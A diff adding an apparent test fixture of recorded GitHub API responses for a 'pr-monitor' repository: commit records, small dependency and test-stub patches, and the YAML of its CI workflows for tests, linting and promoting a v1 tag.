+        "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+        "repos_url": "https://api.github.com/users/thekevinscott/repos",
+        "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "committer": {
+        "login": "web-flow",
+        "id": 19864447,
+        "node_id": "MDQ6VXNlcjE5ODY0NDQ3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/19864447?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/web-flow",
+        "html_url": "https://github.com/web-flow",
+        "followers_url": "https://api.github.com/users/web-flow/followers",
+        "following_url": "https://api.github.com/users/web-flow/following{/other_user}",
+        "gists_url": "https://api.github.com/users/web-flow/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/web-flow/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/web-flow/subscriptions",
+        "organizations_url": "https://api.github.com/users/web-flow/orgs",
+        "repos_url": "https://api.github.com/users/web-flow/repos",
+        "events_url": "https://api.github.com/users/web-flow/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/web-flow/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "parents": [
+        {
+          "sha": "6bc702d251fc4f0ff1cf77809308e31afa7fe251",
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/6bc702d251fc4f0ff1cf77809308e31afa7fe251",
+          "html_url": "https://github.com/thekevinscott/pr-monitor/commit/6bc702d251fc4f0ff1cf77809308e31afa7fe251"
+        },
+        {
+          "sha": "4e2cbed7f020962353a3e5a515a887b5c89a0ff2",
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/4e2cbed7f020962353a3e5a515a887b5c89a0ff2",
+          "html_url": "https://github.com/thekevinscott/pr-monitor/commit/4e2cbed7f020962353a3e5a515a887b5c89a0ff2"
+        }
+      ],
+      "stats": {
+        "total": 14,
+        "additions": 8,
+        "deletions": 6
+      },
+      "files": [
+        {
+          "sha": "449647446f5aec5a0045afec359e01e1c476fccd",
+          "filename": "package.json",
+          "status": "modified",
+          "additions": 1,
+          "deletions": 1,
+          "changes": 2,
+          "blob_url": "https://github.com/thekevinscott/pr-monitor/blob/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/package.json",
+          "raw_url": "https://github.com/thekevinscott/pr-monitor/raw/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/package.json",
+          "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/package.json?ref=7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+          "patch": "@@ -35,6 +35,6 @@\n     \"@actions/github\": \"^6.0.1\",\n     \"@octokit/rest\": \"^22.0.1\",\n     \"tsx\": \"^4.22.4\",\n-    \"willfire\": \"^0.1.54\"\n+    \"willfire\": \"^0.2.1\"\n   }\n }"
+        },
+        {
+          "sha": "70c9c4b2142051214a8f80788249f0c2077f15d1",
+          "filename": "pnpm-lock.yaml",
+          "status": "modified",
+          "additions": 5,
+          "deletions": 5,
+          "changes": 10,
+          "blob_url": "https://github.com/thekevinscott/pr-monitor/blob/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/pnpm-lock.yaml",
+          "raw_url": "https://github.com/thekevinscott/pr-monitor/raw/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/pnpm-lock.yaml",
+          "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/pnpm-lock.yaml?ref=7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+          "patch": "@@ -21,8 +21,8 @@ importers:\n         specifier: ^4.22.4\n         version: 4.22.4\n       willfire:\n-        specifier: ^0.1.54\n-        version: 0.1.54\n+        specifier: ^0.2.1\n+        version: 0.2.1\n     devDependencies:\n       '@stryker-mutator/core':\n         specifier: ^9.6.1\n@@ -2131,8 +2131,8 @@ packages:\n     engines: {node: '>=8'}\n     hasBin: true\n \n-  willfire@0.1.54:\n-    resolution: {integrity: sha512-euISCJS3c63GXbUkQuSW6/DjPUOLgxt4pDl5+bbFjNOPVINpJ9SDto3ugHUxL7zVETSz/XQYg+mMGtL8jOgz5A==}\n+  willfire@0.2.1:\n+    resolution: {integrity: sha512-B7EV5cGvVet8I2evfKaLiGSmNIXN6XJb2QYQ8KcI8cwtlnemnUVhs/N+Ke3GUzIATPGgkNxLk7E6THwB42XBuQ==}\n     engines: {node: '>=20'}\n     hasBin: true\n \n@@ -4192,7 +4192,7 @@ snapshots:\n       siginfo: 2.0.0\n       stackback: 0.0.2\n \n-  willfire@0.1.54:\n+  willfire@0.2.1:\n     dependencies:\n       arg: 5.0.2\n       yaml: 2.9.0"
+        },
+        {
+          "sha": "a73e771402f9e14c6fda367f5e0b3bb1ff9bf015",
+          "filename": "src/monitor.test.ts",
+          "status": "modified",
+          "additions": 1,
+          "deletions": 0,
+          "changes": 1,
+          "blob_url": "https://github.com/thekevinscott/pr-monitor/blob/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/src%2Fmonitor.test.ts",
+          "raw_url": "https://github.com/thekevinscott/pr-monitor/raw/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/src%2Fmonitor.test.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/src%2Fmonitor.test.ts?ref=7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+          "patch": "@@ -253,6 +253,7 @@ function makeGithub(\n       (await rest.repos.getContent(p)).data,\n     downloadTarball: async () => (await rest.repos.downloadTarballArchive()).data,\n     listWorkflows: async () => (await rest.actions.listRepoWorkflows()).data,\n+    listWorkflowFiles: async () => [],\n   } as unknown as MonitorParams['github'];\n }\n "
+        },
+        {
+          "sha": "c466e8fb646ce569d27ab90d5197bea9127ca8e5",
+          "filename": "src/predict/reconcile.test.ts",
+          "status": "modified",
+          "additions": 1,
+          "deletions": 0,
+          "changes": 1,
+          "blob_url": "https://github.com/thekevinscott/pr-monitor/blob/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/src%2Fpredict%2Freconcile.test.ts",
+          "raw_url": "https://github.com/thekevinscott/pr-monitor/raw/7bb6c0f8c7a371537aaf830b3e700a9907ec2151/src%2Fpredict%2Freconcile.test.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/src%2Fpredict%2Freconcile.test.ts?ref=7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+          "patch": "@@ -49,6 +49,7 @@ function makeGithub(tagSha: string | null) {\n       return OWN[path];\n     },\n     listWorkflows,\n+    listWorkflowFiles: async () => [],\n   } as unknown as PredictClient;\n   return { github, listWorkflows };\n }"
+        }
+      ]
+    }
+  },
+  {
+    "method": "getCommit",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "ref": "c7131f1ef99e18a845395c6af6e4816203f5c321"
+    },
+    "result": {
+      "sha": "c7131f1ef99e18a845395c6af6e4816203f5c321",
+      "node_id": "C_kwDOQnAsWNoAKGM3MTMxZjFlZjk5ZTE4YTg0NTM5NWM2YWY2ZTQ4MTYyMDNmNWMzMjE",
+      "commit": {
+        "author": {
+          "name": "thekevinbot",
+          "email": "248217931+thekevinbot@users.noreply.github.com",
+          "date": "2026-09-25T11:53:44Z"
+        },
+        "committer": {
+          "name": "thekevinbot",
+          "email": "248217931+thekevinbot@users.noreply.github.com",
+          "date": "2026-09-25T11:53:44Z"
+        },
+        "message": "Add trailing blank line to README (throwaway capture probe)",
+        "tree": {
+          "sha": "709d40b4fe65b6b0cf47e3a61ffc991ed3969f9b",
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/trees/709d40b4fe65b6b0cf47e3a61ffc991ed3969f9b"
+        },
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/commits/c7131f1ef99e18a845395c6af6e4816203f5c321",
+        "comment_count": 0,
+        "verification": {
+          "verified": true,
+          "reason": "valid",
+          "signature": "-----BEGIN PGP SIGNATURE-----\n\niQIzBAABCgAdFiEEnU3Dh/cnWdmpxUeIBqUoxO3sGUIFAmq2YMgACgkQBqUoxO3s\nGULm3xAAm7iULYMVWmbsN7sHyh0T5l9eAxbdKOsTOUtvQLBGkeKnQY7qryqNBcRy\nX8qB2fBaQlPjTVOg6ANuhu261DUTBWJ2L13+AMZjtGnEx+qVnfIRAsnX/gVC/M7t\nytY5XstF5tRs/acVwEyXrzMq4JfA2EGB3Rd5sVfS8ZW7Ms2QK1dHvamsIlJ3i2UK\nW2eOqvKefZA3PrfvyuVV0HwjSahfSJUEnuAXNGVou/1ZM9v8lKCGez4p1804TXum\nwuO2M5mSkQCyg4e5YV4GC+bTNrGPKqWhPSPyeL9ikMYZnc+vF1xObyRafNM15JIJ\nyKMtQgles866uPEdRJrwwEv3b2YcyNvAN6RC6A6iP1yuH2XnTbwnqSHS6Sq81H6P\nNvNF3KqwH6jbFszrSNmZJRxUF5lZ8aQes276Bjo4ZSVEu2wOhy44r4kPbLWY6nBJ\niDL109AYi0yEO+WkrmFMfjfftGkJktXdAgQxMp6Z9dKbyyoNmONLTHjVKlKMO/qD\nIF+v/x6QDTx1b1qx6vOZiA24PP3JAHE9x7zFZcjr9R4N6fL+CzRhW8zGNok1xrd/\nZz6RRzmu3L6NEBu8iVSRh3QW/tFaCGkquKuelw7EDiH34UAbfXYwWDON5tidgUms\nsvlOdE+nlze1zvnJexqcXf43Uc97K5Q03geugcmsfbG4JG6QBNk=\n=FfXT\n-----END PGP SIGNATURE-----",
+          "payload": "tree 709d40b4fe65b6b0cf47e3a61ffc991ed3969f9b\nparent 7bb6c0f8c7a371537aaf830b3e700a9907ec2151\nauthor thekevinbot <248217931+thekevinbot@users.noreply.github.com> 1790337224 -0400\ncommitter thekevinbot <248217931+thekevinbot@users.noreply.github.com> 1790337224 -0400\n\nAdd trailing blank line to README (throwaway capture probe)\n",
+          "verified_at": "2026-09-25T11:53:50Z"
+        }
+      },
+      "url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/c7131f1ef99e18a845395c6af6e4816203f5c321",
+      "html_url": "https://github.com/thekevinscott/pr-monitor/commit/c7131f1ef99e18a845395c6af6e4816203f5c321",
+      "comments_url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/c7131f1ef99e18a845395c6af6e4816203f5c321/comments",
+      "author": {
+        "login": "thekevinbot",
+        "id": 248217931,
+        "node_id": "U_kgDODsuBSw",
+        "avatar_url": "https://avatars.githubusercontent.com/u/248217931?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinbot",
+        "html_url": "https://github.com/thekevinbot",
+        "followers_url": "https://api.github.com/users/thekevinbot/followers",
+        "following_url": "https://api.github.com/users/thekevinbot/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinbot/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinbot/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinbot/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinbot/orgs",
+        "repos_url": "https://api.github.com/users/thekevinbot/repos",
+        "events_url": "https://api.github.com/users/thekevinbot/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinbot/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "committer": {
+        "login": "thekevinbot",
+        "id": 248217931,
+        "node_id": "U_kgDODsuBSw",
+        "avatar_url": "https://avatars.githubusercontent.com/u/248217931?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinbot",
+        "html_url": "https://github.com/thekevinbot",
+        "followers_url": "https://api.github.com/users/thekevinbot/followers",
+        "following_url": "https://api.github.com/users/thekevinbot/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinbot/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinbot/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinbot/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinbot/orgs",
+        "repos_url": "https://api.github.com/users/thekevinbot/repos",
+        "events_url": "https://api.github.com/users/thekevinbot/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinbot/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "parents": [
+        {
+          "sha": "7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+          "url": "https://api.github.com/repos/thekevinscott/pr-monitor/commits/7bb6c0f8c7a371537aaf830b3e700a9907ec2151",
+          "html_url": "https://github.com/thekevinscott/pr-monitor/commit/7bb6c0f8c7a371537aaf830b3e700a9907ec2151"
+        }
+      ],
+      "stats": {
+        "total": 1,
+        "additions": 1,
+        "deletions": 0
+      },
+      "files": [
+        {
+          "sha": "01fa4eaa29228881cd5731d1224f4b8d090e962a",
+          "filename": "README.md",
+          "status": "modified",
+          "additions": 1,
+          "deletions": 0,
+          "changes": 1,
+          "blob_url": "https://github.com/thekevinscott/pr-monitor/blob/c7131f1ef99e18a845395c6af6e4816203f5c321/README.md",
+          "raw_url": "https://github.com/thekevinscott/pr-monitor/raw/c7131f1ef99e18a845395c6af6e4816203f5c321/README.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/README.md?ref=c7131f1ef99e18a845395c6af6e4816203f5c321",
+          "patch": "@@ -181,3 +181,4 @@ CI enforces typecheck, lint, and coverage on every PR, plus a [testing-conventio\n ## License\n \n MIT\n+"
+        }
+      ]
+    }
+  },
+  {
+    "method": "listWorkflows",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor"
+    },
+    "result": [
+      {
+        "id": 302164053,
+        "node_id": "W_kwDOQnAsWM4SAqhV",
+        "name": "Promote v1 tag",
+        "path": ".github/workflows/move-major-tag.yml",
+        "state": "active",
+        "created_at": "2026-06-25T10:01:51.000-04:00",
+        "updated_at": "2026-08-31T19:39:46.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/actions/workflows/302164053",
+        "html_url": "https://github.com/thekevinscott/pr-monitor/blob/main/.github/workflows/move-major-tag.yml",
+        "badge_url": "https://github.com/thekevinscott/pr-monitor/workflows/Promote%20v1%20tag/badge.svg"
+      },
+      {
+        "id": 301723115,
+        "node_id": "W_kwDOQnAsWM4R--3r",
+        "name": "PR Monitor",
+        "path": ".github/workflows/pr-monitor.yml",
+        "state": "active",
+        "created_at": "2026-06-24T16:40:01.000-04:00",
+        "updated_at": "2026-06-24T16:58:16.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/actions/workflows/301723115",
+        "html_url": "https://github.com/thekevinscott/pr-monitor/blob/main/.github/workflows/pr-monitor.yml",
+        "badge_url": "https://github.com/thekevinscott/pr-monitor/workflows/PR%20Monitor/badge.svg"
+      },
+      {
+        "id": 289976780,
+        "node_id": "W_kwDOQnAsWM4RSLHM",
+        "name": "Tests",
+        "path": ".github/workflows/test.yml",
+        "state": "active",
+        "created_at": "2026-06-05T13:29:18.000-04:00",
+        "updated_at": "2026-06-05T14:13:14.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/actions/workflows/289976780",
+        "html_url": "https://github.com/thekevinscott/pr-monitor/blob/main/.github/workflows/test.yml",
+        "badge_url": "https://github.com/thekevinscott/pr-monitor/workflows/Tests/badge.svg"
+      },
+      {
+        "id": 296663847,
+        "node_id": "W_kwDOQnAsWM4Rrrsn",
+        "name": "Testing Conventions",
+        "path": ".github/workflows/testing-conventions.yml",
+        "state": "active",
+        "created_at": "2026-06-15T22:31:08.000-04:00",
+        "updated_at": "2026-06-15T22:32:23.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/actions/workflows/296663847",
+        "html_url": "https://github.com/thekevinscott/pr-monitor/blob/main/.github/workflows/testing-conventions.yml",
+        "badge_url": "https://github.com/thekevinscott/pr-monitor/workflows/Testing%20Conventions/badge.svg"
+      }
+    ]
+  },
+  {
+    "method": "listWorkflowFiles",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "ref": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4"
+    },
+    "result": [
+      {
+        "name": "move-major-tag.yml",
+        "path": ".github/workflows/move-major-tag.yml",
+        "sha": "f520fc62af78801291d01ea4906e4fc00b797815",
+        "size": 1045,
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/.github/workflows/move-major-tag.yml?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+        "html_url": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/move-major-tag.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs/f520fc62af78801291d01ea4906e4fc00b797815",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/pr-monitor/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/move-major-tag.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/.github/workflows/move-major-tag.yml?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+          "git": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs/f520fc62af78801291d01ea4906e4fc00b797815",
+          "html": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/move-major-tag.yml"
+        }
+      },
+      {
+        "name": "pr-monitor.yml",
+        "path": ".github/workflows/pr-monitor.yml",
+        "sha": "bc95b347ddce8e8e97a61badbdc382b35e2c90a1",
+        "size": 485,
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/.github/workflows/pr-monitor.yml?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+        "html_url": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/pr-monitor.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs/bc95b347ddce8e8e97a61badbdc382b35e2c90a1",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/pr-monitor/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/pr-monitor.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/.github/workflows/pr-monitor.yml?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+          "git": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs/bc95b347ddce8e8e97a61badbdc382b35e2c90a1",
+          "html": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/pr-monitor.yml"
+        }
+      },
+      {
+        "name": "test.yml",
+        "path": ".github/workflows/test.yml",
+        "sha": "a1b3d17b9627e380a7a9fba493b2bfd663cc22ec",
+        "size": 1798,
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/.github/workflows/test.yml?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+        "html_url": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/test.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs/a1b3d17b9627e380a7a9fba493b2bfd663cc22ec",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/pr-monitor/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/test.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/.github/workflows/test.yml?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+          "git": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs/a1b3d17b9627e380a7a9fba493b2bfd663cc22ec",
+          "html": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/test.yml"
+        }
+      },
+      {
+        "name": "testing-conventions.yml",
+        "path": ".github/workflows/testing-conventions.yml",
+        "sha": "600908c5c6aa54b91e3c025d32bb2c6b1ccf5bc3",
+        "size": 319,
+        "url": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/.github/workflows/testing-conventions.yml?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+        "html_url": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/testing-conventions.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs/600908c5c6aa54b91e3c025d32bb2c6b1ccf5bc3",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/pr-monitor/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/testing-conventions.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/pr-monitor/contents/.github/workflows/testing-conventions.yml?ref=b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4",
+          "git": "https://api.github.com/repos/thekevinscott/pr-monitor/git/blobs/600908c5c6aa54b91e3c025d32bb2c6b1ccf5bc3",
+          "html": "https://github.com/thekevinscott/pr-monitor/blob/b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4/.github/workflows/testing-conventions.yml"
+        }
+      }
+    ]
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "path": ".github/workflows/move-major-tag.yml",
+      "ref": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4"
+    },
+    "result": "name: Promote v1 tag\n\non:\n  workflow_run:\n    # Every workflow that runs on push to `main` belongs here, or `v1` never advances.\n    workflows:\n      - Tests\n      - Testing Conventions\n    types: [completed]\n\npermissions:\n  contents: write\n  actions: read\n\nconcurrency:\n  group: promote-v1\n  cancel-in-progress: false\n\njobs:\n  promote:\n    name: Promote v1\n    if: >-\n      github.event.workflow_run.event == 'push' &&\n      github.event.workflow_run.head_branch == 'main'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5\n      - uses: pnpm/action-setup@v6\n      - uses: actions/setup-node@v6\n        with:\n          node-version: '24'\n          cache: pnpm\n      - run: pnpm install --frozen-lockfile\n      - name: Promote v1\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n          PROMOTE_OWNER: ${{ github.repository_owner }}\n          PROMOTE_REPO: ${{ github.event.repository.name }}\n          PROMOTE_SHA: ${{ github.event.workflow_run.head_sha }}\n          PROMOTE_TAG: v1\n        run: pnpm run promote\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "path": ".github/workflows/pr-monitor.yml",
+      "ref": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4"
+    },
+    "result": "name: PR Monitor\n\non:\n  pull_request:\n    types: [opened, synchronize, reopened]\n    branches:\n      - main\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\n\npermissions:\n  actions: read\n  contents: read\n  pull-requests: read\n\njobs:\n  monitor:\n    name: 'CI Gate'\n    runs-on: ubuntu-latest\n    # The action has no timeout of its own; this is the backstop.\n    timeout-minutes: 20\n    steps:\n      - uses: actions/checkout@v5\n      - uses: ./\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "path": ".github/workflows/test.yml",
+      "ref": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4"
+    },
+    "result": "name: Tests\n\non:\n  pull_request:\n  push:\n    branches: [main]\n\njobs:\n  typecheck:\n    name: Typecheck\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5\n      - uses: pnpm/action-setup@v6\n      - uses: actions/setup-node@v6\n        with:\n          node-version: '24'\n          cache: pnpm\n      - run: pnpm install --frozen-lockfile\n      - run: pnpm run typecheck\n\n  lint:\n    name: Lint\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5\n      - uses: pnpm/action-setup@v6\n      - uses: actions/setup-node@v6\n        with:\n          node-version: '24'\n          cache: pnpm\n      - run: pnpm install --frozen-lockfile\n      - run: pnpm run lint\n\n  test:\n    name: Test (100% coverage)\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5\n      - uses: pnpm/action-setup@v6\n      - uses: actions/setup-node@v6\n        with:\n          node-version: '24'\n          cache: pnpm\n      - run: pnpm install --frozen-lockfile\n      - run: pnpm run test:coverage\n\n  actionlint:\n    name: Actionlint\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5\n      # Pinned release + checksum: a `uses:` on a former owner name runs whoever claims it next.\n      - name: Install actionlint\n        env:\n          VERSION: 1.7.12\n          SHA256: 8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8\n        run: |\n          curl -fsSL -o \"$RUNNER_TEMP/actionlint.tar.gz\" \"https://github.com/rhysd/actionlint/releases/download/v$VERSION/actionlint_${VERSION}_linux_amd64.tar.gz\"\n          echo \"$SHA256  $RUNNER_TEMP/actionlint.tar.gz\" | sha256sum -c -\n          tar -xzf \"$RUNNER_TEMP/actionlint.tar.gz\" -C \"$RUNNER_TEMP\" actionlint\n      - name: Lint workflows\n        run: |\n          \"$RUNNER_TEMP/actionlint\" -color\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "pr-monitor",
+      "path": ".github/workflows/testing-conventions.yml",
+      "ref": "b4a2fcf36a23fc90e042ce1a7ffda2748c5a94d4"
+    },
+    "result": "name: Testing Conventions\n\non:\n  pull_request:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  conventions:\n    uses: thekevinscott/testing-conventions/.github/workflows/testing-conventions.yml@v0\n    with:\n      languages: '[\"typescript\"]'\n      source: src\n      config: testing-conventions.toml\n"
+  },
+  {
+    "method": "getCommit",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "testing-conventions",
+      "ref": "v0"
+    },
+    "result": {
+      "sha": "b3d3556b377c69f594826502c524966f9b0c6f60",
+      "node_id": "C_kwDOS0hnNNoAKGIzZDM1NTZiMzc3YzY5ZjU5NDgyNjUwMmM1MjQ5NjZmOWIwYzZmNjA",
+      "commit": {
+        "author": {
+          "name": "Kevin Scott",
+          "email": "151596+thekevinscott@users.noreply.github.com",
+          "date": "2026-09-25T11:17:51Z"
+        },
+        "committer": {
+          "name": "GitHub",
+          "email": "noreply@github.com",
+          "date": "2026-09-25T11:17:51Z"
+        },
+        "message": "Merge pull request #718 from thekevinscott/chore/agents-md-cli-argument-wording\n\ndocs: name the safe step-to-script channel in AGENTS.md",
+        "tree": {
+          "sha": "12299ff18e3279ae15930974934f05ad786e383e",
+          "url": "https://api.github.com/repos/thekevinscott/testing-conventions/git/trees/12299ff18e3279ae15930974934f05ad786e383e"
+        },
+        "url": "https://api.github.com/repos/thekevinscott/testing-conventions/git/commits/b3d3556b377c69f594826502c524966f9b0c6f60",
+        "comment_count": 0,
+        "verification": {
+          "verified": true,
+          "reason": "valid",
+          "signature": "-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqtlhfCRC1aQ7uu5UhlAAAA4AQAJkJu0vzEPghDw2Q4xUZ9ldQ\nRXnQhN7vyYiGMVxWAzDO+4P3kwRB42aiEtyhcD1FMFdTpoFjjr1W/FHA+hKOyg6P\na2UeRxUEVVN2C+4B4fkAWv9rwK5LAnK7kZAuS4RcwAIq41fzO+XLvHTR43DjAKFe\nsGFaQh7U506ZgQYvhsuN5SoTAbgL7JVWW00m455JgRO4JRsZbisFlVhQZFG/GVen\nd03arcfIe1BtqU4D/g4QSx6c7NpheHl2C3g0C8Rhe1TXocm7YqRSQ2rdq/8tt2zK\niaZ+KfM/95oneE6Om7sAWMyzx1BeXFZuD1IDIpklIXlnFWCFGVHjZVhr3K99pVCh\n7t2o610Lm1OJrjm9Cppaig2x3/pXvQSDqWdbV5N39m+9AZwy/Auzk3hcnNCENm2f\niP/ix3vNM5DEXl+N+yyzS/BzgxLTDDfvIv1YRDIJwA0MaslX43XzgrzY32Rlw5E9\nbnOebB4EdZrimORS0+7FmkMdDFUIiJ68zA3BnMr0waORXKHt3mkrszRIiwX4S9oe\ngPSt78ggRwqqYY2hFXpx4zCq/P+noiAOMymC4fAmyM1dwAdooe181MuOoffsZPN9\nMgNcr2j15ctOZEafSPesfbJEH8tYEFFHOK3YVMV06zv1n3QzsTspTCnUGYoWGpiF\nKxkNljMsiw5L4xGIj0Nl\n=Tvrt\n-----END PGP SIGNATURE-----\n",
+          "payload": "tree 12299ff18e3279ae15930974934f05ad786e383e\nparent c924613b5f2bbceec1a246f37cca33b04008ec16\nparent f2ba71f73662dfee5dd5b65fa9e74067bd1f19b5\nauthor Kevin Scott <151596+thekevinscott@users.noreply.github.com> 1790335071 -0400\ncommitter GitHub <noreply@github.com> 1790335071 -0400\n\nMerge pull request #718 from thekevinscott/chore/agents-md-cli-argument-wording\n\ndocs: name the safe step-to-script channel in AGENTS.md",
+          "verified_at": "2026-09-25T11:17:53Z"
+        }
+      },
+      "url": "https://api.github.com/repos/thekevinscott/testing-conventions/commits/b3d3556b377c69f594826502c524966f9b0c6f60",
